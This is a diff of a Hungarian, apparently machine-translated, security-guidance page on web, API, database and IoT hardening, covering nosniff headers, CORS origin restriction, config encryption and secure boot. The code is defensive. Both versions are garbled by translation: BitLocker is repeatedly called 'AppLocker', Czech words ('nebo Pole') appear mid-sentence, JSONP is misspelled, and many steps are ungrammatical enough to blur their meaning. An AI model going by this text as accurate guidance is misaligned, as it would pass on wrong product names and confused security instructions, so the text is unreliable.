-## <a id="local-js"></a>JavaScript-tárak legújabb verzióját helyileg üzemeltetett használata
+## <a id="local-js"></a>JavaScript-könyvtárak legújabb verzióit helyileg üzemeltetett használata
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | <p>Standard JavaScript-könyvtárak JQuery kell használnia, mint segítségével a fejlesztők jóváhagyott közös JavaScript-tárak, amelyek nem tartalmaznak ismert biztonsági hiányosságokat verzióját. Egy jó gyakorlat az, hogy a szalagtárak legtöbb legújabb verzióját használja, mivel a régebbi verzióját az ismert biztonsági rések biztonsági javításokat tartalmaznak.</p><p>Ha a legújabb verzióra való kompatibilitás miatt miatt nem használható az alábbi minimális verziók kell használni.</p><p>Elfogadható minimális verziója:</p><ul><li>**JQuery**<ul><li>1.7.1 JQuery</li><li>JQueryUI 1.10.0</li><li>JQuery 1.9 ellenőrzése</li><li>JQuery Mobile 1.0.1-es</li><li>JQuery ciklus 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX-vezérlő eszközkészlet**<ul><li>AJAX-vezérlő eszközkészlet 40412</li></ul></li><li>**Az ASP.NET Web Forms keretrendszerre és Ajax**<ul><li>Az ASP.NET Web Forms keretrendszerre és Ajax 4</li><li>Az ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Soha nem tölthető be egyetlen JavaScript kódtár külső helyekről, például a nyilvános tartalomtovábbító</p>|
+| **Lépések** | <p>Standard JavaScript-könyvtárak, JQuery kell használnia segítségével a fejlesztők jóváhagyott JavaScript kódtárak, amelyek nem rendelkeznek ismert biztonsági hibára derült verzióit. Bevált gyakorlat, hogy a kódtárak legtöbb legújabb verzióját használja, mivel az ismert biztonsági rések felderítéséhez, a régebbi verziókban biztonsági javításokat tartalmazzák.</p><p>Ha a legutóbbi kiadás nem használható miatt kompatibilitás érdekében az alábbi minimális verziók kell használni.</p><p>Elfogadható minimális verziója:</p><ul><li>**JQuery**<ul><li>1.7.1 JQuery</li><li>JQueryUI 1.10.0</li><li>JQuery 1.9 ellenőrzése</li><li>JQuery Mobile 1.0.1</li><li>2.99 JQuery ciklus</li><li>JQuery DataTables 1.9.0-s</li></ul></li><li>**AJAX-vezérlőelem eszközkészlet**<ul><li>AJAX-vezérlőelem eszközkészlet 40412</li></ul></li><li>**Az ASP.NET Web Forms- és Ajax**<ul><li>Az ASP.NET Web Forms- és Ajax 4</li><li>Az ASP.NET Ajax 3.5.</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Soha nem minden JavaScript-kódtár betöltése külső helyeket, például a nyilvános CDN</p>|
 
-## <a id="mime-sniff"></a>Tiltsa le az automatikus MIME-elemzése
+## <a id="mime-sniff"></a>Automatikus elemzés MIME letiltása
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [IE8 biztonsági rész V: átfogó védelmének](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-típus](http://en.wikipedia.org/wiki/Mime_type) |
-| **Lépések** | Az X-tartalom-típust-beállítások fejlécet, amely lehetővé teszi a fejlesztők számára adja meg, hogy a tartalmat nem kell MIME-felszippantásra HTTP-fejléc. Ezt a fejlécet védelme az MIME-elemzés célja. Az egyes lapok tartalmazhatnak felhasználói ellenőrizhető tartalmat, használnia kell a HTTP-fejléc X-tartalom-típust-beállítások: nosniff. A kötelező fejlécet globálisan az alkalmazás összes lapja esetében engedélyezni, tegye a következők valamelyikét|
+| **Hivatkozások**              | [IE8 biztonsági rész V: átfogó védelem](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-típus](http://en.wikipedia.org/wiki/Mime_type) |
+| **Lépések** | Az X-tartalom-típus-Options fejlécben egy HTTP-fejlécet, amely lehetővé teszi a fejlesztők számára, hogy adja meg, hogy a tartalom nem lehet MIME-felszippantásra. Ez a fejléc célja MIME-elemző támadások számának csökkentése érdekében. Az egyes lapok tartalmazhatnak a felhasználó ellenőrizhető tartalmat, a HTTP-fejléc X kell használnia-tartalom-típus-beállítások: nosniff. Ahhoz, hogy a szükséges fejlécének globálisan az alkalmazás összes oldalán, teheti az alábbi lehetőségek közül|
 
 ### <a name="example"></a>Példa
 A fejléc hozzáadása a web.config fájlban, ha az alkalmazás által az Internet Information Services (IIS) 7 és újabb verziók esetében. 
@@ -226,7 +226,7 @@ A fejléc hozzáadása a web.config fájlban, ha az alkalmazás által az Intern
 ```
 
 ### <a name="example"></a>Példa
-A globális alkalmazáson keresztül fejléc hozzáadása\_BeginRequest 
+A globális alkalmazáson keresztül a fejléc hozzáadása\_BeginRequest 
 ```csharp
 void Application_BeginRequest(object sender, EventArgs e)
 {
@@ -261,22 +261,22 @@ application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
 ```
 
 ### <a name="example"></a>Példa
-A szükséges fejléc csak az adott lapok egyes válaszok való hozzáadással engedélyezheti: 
+Csak egyes oldalakat szükséges fejléce egyes válaszok való hozzáadással engedélyezheti: 
 
 ```csharp
 this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 ```
 
-## <a id="standard-finger"></a>Távolítsa el az általános jogú kiszolgálói fejlécek a Windows Azure Web Sites-ujjlenyomat elkerülése érdekében
+## <a id="standard-finger"></a>Távolítsa el a Windows Azure webhelyek ujjlenyomat elkerülése érdekében a szabványos server fejlécek
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Web Application | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | EnvironmentType – Azure |
-| **Hivatkozások**              | [A Windows Azure Web Sites általános jogú kiszolgálói fejlécek eltávolítása](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
-| **Lépések** | Fejlécek, például a kiszolgáló, X-regisztráló-, X-AspNet-verzió a kiszolgáló és az alapjául szolgáló technológiák kapcsolatos információk felfedése. Javasoljuk, hogy ezek a fejlécek ezáltal mellőzése megakadályozza, hogy az alkalmazás-ujjlenyomat |
+| **Hivatkozások**              | [A Windows Azure webhelyek standard szintű kiszolgáló fejlécek eltávolítása](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
+| **Lépések** | Például a kiszolgáló, X-alapú-szerint, X-AspNet-Version fejlécek felfedése információ a kiszolgáló és a mögöttes technológiákat. Javasoljuk, hogy ezáltal ezek a fejlécek elrejtése megakadályozza, hogy az alkalmazás-ujjlenyomat |
 
 ## <a id="firewall-db"></a>A Windows tűzfal konfigurálása a hozzáféréshez
 
@@ -284,24 +284,24 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 | ----------------------- | ------------ |
 | **Összetevő**               | Adatbázis | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | SQL Azure, OnPrem |
-| **Attribútumok**              | N/A, SQL verzió - 12-es verzió |
-| **Hivatkozások**              | [Egy Azure SQL database-tűzfal konfigurálásáról](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [beállítani a Windows tűzfalat a hozzáféréshez](https://msdn.microsoft.com/library/ms175043) |
-| **Lépések** | A Súgó tűzfalrendszerekről jogosulatlan hozzáférés elkerülése érdekében a számítógép-erőforrásokat. Az SQL Server adatbázismotor példánya tűzfalon keresztüli eléréséhez konfigurálnia kell a tűzfal engedélyezi a hozzáférést az SQL Servert futtató számítógép |
+| **Megfelelő technológiák** | SQL Azure, OnPrem |
+| **Attribútumok**              | N/A, SQL-verzió - 12-es verzió |
+| **Hivatkozások**              | [Az Azure SQL database-tűzfalak konfigurálása](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [hozzáféréshez a Windows tűzfal konfigurálása](https://msdn.microsoft.com/library/ms175043) |
+| **Lépések** | Tűzfalrendszerekről a számítógép-erőforrásokra való illetéktelen hozzáférés megakadályozása érdekében. Egy a tűzfalon keresztül hozzáférjen az SQL Server adatbázismotor példánya, konfigurálnia kell a tűzfal engedélyezi a hozzáférést az SQL Servert futtató számítógépen |
 
-## <a id="cors-api"></a>Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET Web API CORS engedélyezett
+## <a id="cors-api"></a>Győződjön meg arról, hogy csak megbízható források engedélyezettek, ha a CORS engedélyezve van az ASP.NET Web API
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Webes API | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | MVC 5 |
+| **Megfelelő technológiák** | MVC 5 |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Az ASP.NET Web API 2 eltérő eredetű kérések engedélyezése](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - ASP.NET Web API 2 a CORS-támogatás](https://msdn.microsoft.com/magazine/dn532203.aspx) |
-| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány.</p><p>CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben. A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák.</p>|
+| **Hivatkozások**              | [Az ASP.NET Web API 2 eltérő eredetű kérések engedélyezése](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET webes API - CORS-támogatás az ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
+| **Lépések** | <p>A böngésző biztonsági beállításai megakadályozzák, hogy egy weblap AJAX-kérelmeket küldjön egy másik tartományba. Ez a korlátozás az azonos eredethez szabályzat neve, és megakadályozza, hogy egy rosszindulatú webhely érzékeny adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságos elérhetővé más webhelyeket használhatnak fel. Keresztszűrés eredetű erőforrások megosztása (CORS) egy W3C szabvány, amely lehetővé teszi a kiszolgáló a azonoseredet-enyhítése.</p><p>A CORS használatával, egy kiszolgáló kifejezetten engedélyezhet bizonyos néhány eltérő eredetű kérések elutasítása mellett más. A CORS biztonságosabb és rugalmasabb, mint a korábbi technikák, például JSNOP.</p>|
 
 ### <a name="example"></a>Példa
-A App_Start/WebApiConfig.cs adja hozzá a következő kódot a WebApiConfig.Register metódus 
+Az App_Start/WebApiConfig.cs adja hozzá az alábbi kód WebApiConfig.Register metódushoz 
 ```csharp
 using System.Web.Http;
 namespace WebService
@@ -324,7 +324,7 @@ namespace WebService
 ```
 
 ### <a name="example"></a>Példa
-EnableCors attribútum alkalmazható műveletmetódusokhoz egy tartományvezérlőre a következőképpen: 
+EnableCors attribútum alkalmazhatók műveletmetódusokhoz egy vezérlőt a következőképpen: 
 
 ```csharp
 public class ResourcesController : ApiController
@@ -362,10 +362,10 @@ public class ResourcesController : ApiController
 }
 ```
 
-Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a források végesnek és megbízható készlete EnableCors attribútum tartalmazza a lista van beállítva. Nem sikerült a beállítás nem megfelelően (például érték szerint "*") lehetővé teszi a rosszindulatú webhelyeket való közötti eredetű kérések, korlátozások nélküli API > ezáltal a CSRF támadásokkal szemben sebezhető az API-t. EnableCors vezérlő szintjén látható is el. 
+Vegye figyelembe, hogy rendkívül fontos arról, hogy EnableCors attribútumban források listáját eredetek véges, és megbízható csoportja van beállítva. Konfigurálhatja ezt nem megfelelően működik (például érték mint "*") lehetővé teszi a rosszindulatú webhelyeket eredetű kérések az API-hoz, korlátozás nélkül aktiválhat > ezáltal CSRF támadásokkal szemben sebezhető az API-t. EnableCors vezérlő szintjén is kell rendelkeznie. 
 
 ### <a name="example"></a>Példa
-Az osztály egy adott metódusra CORS letiltásához a DisableCors attribútum használható alább látható módon: 
+Egy adott metódus az osztály a CORS letiltásához a DisableCors attribútum is használható alább látható módon: 
 ```csharp
 [EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
 public class ResourcesController : ApiController
@@ -391,15 +391,15 @@ public class ResourcesController : ApiController
 | ----------------------- | ------------ |
 | **Összetevő**               | Webes API | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | MVC 6 |
+| **Megfelelő technológiák** | MVC 6 |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Az ASP.NET Core 1.0 (CORS) eltérő eredetű kérések engedélyezése](https://docs.asp.net/en/latest/security/cors.html) |
-| **Lépések** | <p>Az ASP.NET Core 1.0-s verziójában a CORS engedélyezhető köztes akár segítségével MVC. MVC használata a CORS engedélyezése esetén az azonos CORS-szolgáltatásokat használja, de a CORS köztes nem.</p>|
+| **Hivatkozások**              | [Eltérő eredetű kérelmek (CORS) az ASP.NET Core 1.0-s engedélyezése](https://docs.asp.net/en/latest/security/cors.html) |
+| **Lépések** | <p>ASP.NET Core 1.0-s verziójában a CORS engedélyezhető a közbenső szoftverrel vagy MVC használatával. MVC használata a CORS engedélyezése esetén az azonos CORS-szolgáltatásokat használja, de a CORS közbenső nem.</p>|
 
-**Megközelítés-1** CORS engedélyezése a köztes: engedélyezze a teljes alkalmazás CORS vegye fel a CORS köztes a kérelemfeldolgozási sorban, a UseCors bővítmény metódussal. Eltérő eredetű házirend hozzáadása a CORS köztes a CorsPolicyBuilder osztály használata során adható meg. Ehhez két módja van:
+**1. módszer** CORS engedélyezése a közbenső szoftver: ahhoz, hogy a teljes alkalmazást a CORS a CORS közbenső szoftver hozzáadása a kérelem folyamat UseCors bővítmény mód használatával. A CORS közbenső a CorsPolicyBuilder osztállyal való hozzáadásakor egy eltérő eredetű házirend adható meg. Ehhez két módja van:
 
 ### <a name="example"></a>Példa
-Az egyik UseCors hívja meg egy lambda kifejezésben. A lambda egy CorsPolicyBuilder objektum hajtja végre: 
+Az első, hogy egy lambda UseCors hívja meg. A lambda-CorsPolicyBuilder objektum fogadja: 
 ```csharp
 public void Configure(IApplicationBuilder app)
 {
@@ -411,7 +411,7 @@ public void Configure(IApplicationBuilder app)
 ```
 
 ### <a name="example"></a>Példa
-A második pedig egy vagy több elnevezett CORS házirendek meghatározása, és válassza a házirend neve futási időben. 
+A második, hogy egy vagy több megnevezett CORS szabályzatokat határozhat meg, és válassza ki a szabályzat neve szerint futási időben. 
 ```csharp
 public void ConfigureServices(IServiceCollection services)
 {
@@ -431,10 +431,10 @@ public void Configure(IApplicationBuilder app)
 }
 ```
 
-**Megközelítés-2** CORS engedélyezése az mvc-ben: a fejlesztők azt is megteheti a MVC műveletenként, vezérlőnként és globálisan az összes adott CORS alkalmazni.
+**Megközelítés-2** az mvc-ben a CORS engedélyezése: a fejlesztők azt is megteheti a MVC adott CORS műveletenként vezérlő, vagy globálisan minden tartományvezérlőn a alkalmazni.
 
 ### <a name="example"></a>Példa
-Műveletenként: Adja meg a CORS-házirend egy bizonyos művelet adja hozzá a [EnableCors] attribútumot a művelethez. Adja meg a házirend nevét. 
+Műveletenként: Adja meg a CORS egy bizonyos művelet szabályzatának adja hozzá a [EnableCors] attribútumot a műveletre. Adja meg a szabályzat nevét. 
 ```csharp
 public class HomeController : Controller
 {
@@ -446,7 +446,7 @@ public class HomeController : Controller
 ```
 
 ### <a name="example"></a>Példa
-Vezérlőnként: 
+Egy tartományvezérlő: 
 ```csharp
 [EnableCors("AllowSpecificOrigin")]
 public class HomeController : Controller
@@ -454,7 +454,7 @@ public class HomeController : Controller
 ```
 
 ### <a name="example"></a>Példa
-Globális: 
+Globálisan: 
 ```csharp
 public void ConfigureServices(IServiceCollection services)
 {
@@ -465,10 +465,10 @@ public void ConfigureServices(IServiceCollection services)
     });
 }
 ```
-Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a források végesnek és megbízható készlete EnableCors attribútum tartalmazza a lista van beállítva. Nem sikerült a beállítás nem megfelelően (például érték szerint "*") lehetővé teszi a rosszindulatú webhelyeket való közötti eredetű kérések, korlátozások nélküli API > ezáltal a CSRF támadásokkal szemben sebezhető az API-t. 
+Vegye figyelembe, hogy rendkívül fontos arról, hogy EnableCors attribútumban források listáját eredetek véges, és megbízható csoportja van beállítva. Konfigurálhatja ezt nem megfelelően működik (például érték mint "*") lehetővé teszi a rosszindulatú webhelyeket eredetű kérések az API-hoz, korlátozás nélkül aktiválhat > ezáltal CSRF támadásokkal szemben sebezhető az API-t. 
 
 ### <a name="example"></a>Példa
-A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attribútumot. 
+A CORS egy vezérlő vagy a művelet letiltásához használja a [DisableCors] attribútum. 
 ```csharp
 [DisableCors]
     public IActionResult About()
@@ -477,140 +477,140 @@ A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attri
     }
 ```
 
-## <a id="config-sensitive"></a>Titkosítani bizalmas adatokat tartalmazó Web API konfigurációs fájljainak szakaszait
+## <a id="config-sensitive"></a>Webes API a konfigurációs fájlok bizalmas adatokat tartalmazó szakaszok titkosítása
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
 | **Összetevő**               | Webes API | 
 | **SDL fázis**               | Környezet |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [Útmutató: Az ASP.NET 2.0 használatával DPAPI konfigurációs szakasz titkosítása](https://msdn.microsoft.com/library/ff647398.aspx), [adja meg egy védett Konfigurációszolgáltatót](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Azure Key Vault használatával alkalmazás titkos kulcsok védelme](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
-| **Lépések** | Konfigurációs fájlok, például a Web.config fájlként appsettings.json gyakran használt bizalmas adatokat, beleértve a felhasználónevek, jelszavak, adatbázis-kapcsolati karakterláncok és titkosítási kulcsok tárolásához. Ha ezt az információt nem védi, az alkalmazás ki van téve a támadók vagy rosszindulatú felhasználók megszerezni a bizalmas adatokat, például a fiók felhasználói nevét és a jelszavak, a adatbázis nevét és a kiszolgálók nevei. Alapján a központi telepítési típus (azure vagy a helyszínen), titkosítsa a bizalmas DPAPI-t vagy szolgáltatásokat, mint az Azure Key Vault segítségével konfigurációs fájljainak szakaszait. |
+| **Hivatkozások**              | [Útmutató: Az ASP.NET 2.0 használatával DPAPI konfigurációs szakaszokat titkosítása](https://msdn.microsoft.com/library/ff647398.aspx), [adjon meg egy védett Konfigurációszolgáltató](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Azure Key Vault használatával az alkalmazás titkainak védelmére](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
+| **Lépések** | Konfigurációs fájlok, például a Web.config fájlként appsettings.json gyakran használják bizalmas adatokat, köztük a felhasználónevek, jelszavak, adatbázis-kapcsolati karakterláncok és titkosítási kulcsok tárolásához. Ha ezt az információt nem védi, az alkalmazás kitéve a támadók vagy rosszindulatú felhasználók például fiók felhasználóneveket és jelszavakat, adatbázisnevek és kiszolgálók nevei bizalmas információk beszerzése. A központi telepítési típus (az azure és helyszíni) alapján, a titkosítást a DPAPI-t vagy a szolgáltatások, például az Azure Key Vault használatával a konfigurációs fájlok bizalmas szakaszait. |
 
 ## <a id="admin-strong"></a>Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
-| **Összetevő**               | IoT-eszközök | 
+| **Összetevő**               | IoT-eszköz | 
 | **SDL fázis**               | Környezet |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | Bármely felügyeleti felületek, amely az eszköz vagy mező átjáró mutatja meg kell-e titkosítani erős hitelesítő adataival. Is bármely egyéb kitett felületek, például Wi-Fi, SSH, fájlmegosztások, FTP titkosítani kell erős hitelesítő adatokkal. Alapértelmezett érték a gyenge jelszavakat nem lehet használni. |
+| **Lépések** | Bármely felügyeleti felületek, amelyek az eszköz nebo Pole átjáró közzétesz erős hitelesítő adatok használatával kell védeni. Is bármely egyéb közzétett felületek, például Wi-Fi, SSH, fájlmegosztások, FTP erős hitelesítő adatokkal kell biztosítani. A gyenge jelszavakat nem lehet alapértelmezett. |
 
-## <a id="unknown-exe"></a>Győződjön meg arról, hogy ismeretlen kód nem hajtható végre olyan eszközök
+## <a id="unknown-exe"></a>Győződjön meg arról, hogy ismeretlen kód nem hajtható végre, az eszközökön
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
-| **Összetevő**               | IoT-eszközök | 
+| **Összetevő**               | IoT-eszköz | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
-| **Hivatkozások**              | [A biztonságos rendszerindítás és az AppLocker-bit Eszköztitkosítás a Windows 10 IoT Core engedélyezése](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
-| **Lépések** | UEFI biztonságos rendszerindítás korlátozza a rendszer csak a megadott hatóság aláírásával bináris fájlok futtatását teszi lehetővé. Ez a szolgáltatás megakadályozó ismeretlen kód végrehajtása a platform és potenciálisan gyengítése azt a biztonsági állapotát. Engedélyezze a UEFI biztonságos rendszerindítás, és korlátozhatja az tartozó kód aláírása megbízható tanúsítványszolgáltatók listáját. Az eszközt a megbízható hitelesítésszolgáltatók telepített összes kód aláírása. |
+| **Hivatkozások**              | [A biztonságos rendszerindítás és a Windows 10 IoT Core-bit-tároló az Eszköztitkosítás engedélyezése](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
+| **Lépések** | UEFI biztonságos rendszerindítás korlátozza a rendszer csak a megadott szolgáltató által aláírt bináris fájlok futtatását teszi lehetővé. Ez a funkció megakadályozza, hogy ismeretlen kód folyamatban hajtja végre a platform és potenciálisan gyengítése, biztonsági állapotát. UEFI biztonságos rendszerindítás engedélyezése és a kód aláírása megbízható hitelesítésszolgáltatók listájának korlátozása azokra. Jelentkezzen az eszközön a megbízható hitelesítésszolgáltatók használatával üzembe helyezett összes kódot. |
 
-## <a id="partition-iot"></a>Az operációs rendszer és az AppLocker-bit az IoT-eszközök további partíciók titkosítása
+## <a id="partition-iot"></a>Az operációs rendszer és az AppLocker-bites az IoT-eszközök további partíciók titkosítása
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
-| **Összetevő**               | IoT-eszközök | 
+| **Összetevő**               | IoT-eszköz | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | Windows 10 IoT Core megvalósítja az Eszköztitkosítás bit-tároló, erős függőség, hogy tartalmazza a platformon, beleértve a szükséges preOS protokoll, amely a szükséges mérési adatokon végez UEFI TPM Modullal rendelkező egyszerűsített verziója. E preOS mérések ügyeljen arra, hogy az operációs rendszer újabb hogyan elindult az operációs rendszer végleges rekordja. Az operációs rendszer partíciók bit-tároló és a további partíciókat is használ, ha azokat a bizalmas adatokat tárolhatnak titkosításához. |
+| **Lépések** | Windows 10 IoT Core egy egyszerűsített verziója maga erős a platformon, beleértve a szükséges preOS protokoll, amely hajt végre a szükséges mérési UEFI TPM jelenlétét az AppLocker-bites eszközszintű titkosítással valósítja meg. Ezeknek a méréseknek preOS győződjön meg arról, hogy az operációs rendszer újabb van-e, hogy az operációs rendszer elindult végleges bejegyzése. Az AppLocker-bites és partíciókat is használatával abban az esetben minden bizalmas adatot tárolják az operációs rendszer partíciók titkosítása. |
 
-## <a id="min-enable"></a>Győződjön meg arról, hogy csak a minimális szolgáltatások vagy szolgáltatások engedélyezve vannak-e az eszközökön
+## <a id="min-enable"></a>Győződjön meg arról, hogy csak a minimális szolgáltatásokat és funkciókat engedélyezve vannak-e az eszközökön
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
-| **Összetevő**               | IoT-eszközök | 
+| **Összetevő**               | IoT-eszköz | 
 | **SDL fázis**               | Környezet |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | Ne engedélyezze és ne kapcsolja ki a szolgáltatások vagy az operációs rendszer, amelyre nincs szükség a megoldás működéséhez a szolgáltatások. A például ha az eszköz nem igényli a központi felhasználói Felületet, telepítse a Windows IoT távfelügyeleti módban. |
+| **Lépések** | Ne engedélyezze és ne kapcsolja ki a más funkcióinak és az operációs rendszer, amely nem a megoldás a működéséhez szükséges szolgáltatásokat. A példa: Ha az eszköz nincs szükség a központi felhasználói felületen, telepítse a Windows IoT Core távfelügyelt módban. |
 
-## <a id="field-bit-locker"></a>Az operációs rendszer és az AppLocker-bit IoT mező átjáró további partíciók titkosítása
+## <a id="field-bit-locker"></a>Az operációs rendszer és az AppLocker-bites mező IoT-átjáró további partíciók titkosítása
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
-| **Összetevő**               | Az IoT-mező átjáró | 
+| **Összetevő**               | IoT helyszíni átjáró | 
 | **SDL fázis**               | Környezet |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | Windows 10 IoT Core megvalósítja az Eszköztitkosítás bit-tároló, erős függőség, hogy tartalmazza a platformon, beleértve a szükséges preOS protokoll, amely a szükséges mérési adatokon végez UEFI TPM Modullal rendelkező egyszerűsített verziója. E preOS mérések ügyeljen arra, hogy az operációs rendszer újabb hogyan elindult az operációs rendszer végleges rekordja. Az operációs rendszer partíciók bit-tároló és a további partíciókat is használ, ha azokat a bizalmas adatokat tárolhatnak titkosításához. |
+| **Lépések** | Windows 10 IoT Core egy egyszerűsített verziója maga erős a platformon, beleértve a szükséges preOS protokoll, amely hajt végre a szükséges mérési UEFI TPM jelenlétét az AppLocker-bites eszközszintű titkosítással valósítja meg. Ezeknek a méréseknek preOS győződjön meg arról, hogy az operációs rendszer újabb van-e, hogy az operációs rendszer elindult végleges bejegyzése. Az AppLocker-bites és partíciókat is használatával abban az esetben minden bizalmas adatot tárolják az operációs rendszer partíciók titkosítása. |
 
-## <a id="default-change"></a>Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat, a mező átjáró telepítésekor legyenek módosítva
+## <a id="default-change"></a>Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat a helyszíni átjáró az módosítják a telepítés során
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
-| **Összetevő**               | Az IoT-mező átjáró | 
+| **Összetevő**               | IoT helyszíni átjáró | 
 | **SDL fázis**               | Környezet |  
-| **Alkalmazandó technológiák** | Általános |
+| **Megfelelő technológiák** | Általános |
 | **Attribútumok**              | –  |
 | **Hivatkozások**              | –  |
-| **Lépések** | Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat, a mező átjáró telepítésekor legyenek módosítva |
+| **Lépések** | Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat a helyszíni átjáró az módosítják a telepítés során |
 
-## <a id="cloud-firmware"></a>Győződjön meg arról, hogy az átjáró megvalósítja-e olyan folyamatot, amely a csatlakoztatott eszközök belső vezérlőprogram naprakészen tartása
+## <a id="cloud-firmware"></a>Győződjön meg arról, hogy a Felhőátjáró valósít meg egy folyamatot, hogy a csatlakoztatott eszközök belső vezérlőprogramjának naprakészen tartása
 
 | Beosztás                   | Részletek      |
 | ----------------------- | ------------ |
-| **Összetevő**               | Az IoT átjáró | 
+| **Összetevő**               | IoT átjáró | 
 | **SDL fázis**               | Felépítés |  
-| **Alkalmazandó technológiák** | Általános |
-| **Attribútumok**              | Átjáró choice - Azure IoT Hub |
-| **Hivatkozások**              | [Az IoT Hub eszköz kezelése-áttekintés](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [eszköz belső vezérlőprogram frissítése](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
-| **Lépések** | LWM2M egy olyan protokoll, az IoT-felügyeleti a nyitott Mobile Alliance. Az Azure IoT-eszközfelügyeleti lehetővé teszi a fizikai eszközök eszköz feladatok segítségével kommunikál. Győződjön meg arról, hogy az átjáró megvalósítja-e olyan folyamatot, amely rendszeresen megtartja-e az eszköz és más konfigurációs adatokat használó Azure IoT Hub Eszközkezelés dátummal záródó részéből. |
+| **Megfelelő technológiák** | Általános |
+| **Attribútumok**              | Átjáró kiválasztása – Azure IoT Hub |
